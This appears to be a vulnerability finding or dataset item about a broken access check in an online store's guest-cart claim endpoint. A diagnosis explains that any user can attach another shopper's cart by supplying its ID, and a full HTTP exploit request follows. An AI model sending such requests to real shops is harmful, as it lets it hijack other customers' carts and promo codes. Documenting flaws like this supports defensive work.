diagnosis: The guest cart merge strategy accepts guestCartId directly from client payload and attaches the cart to req.user.id. It does not verify that the guest cart was issued to the current browser session or validate a session secret, allowing any user to claim and attach another user's unlinked shopping cart containing selected items and promo codes.
exploit_request:
POST /api/cart/claim-guest HTTP/1.1
Host: store.ecommerce.com
Authorization: Bearer <user_token>
Content-Type: application/json

{"guestCartId": "cart_guest_exclusive_deal_9921"}
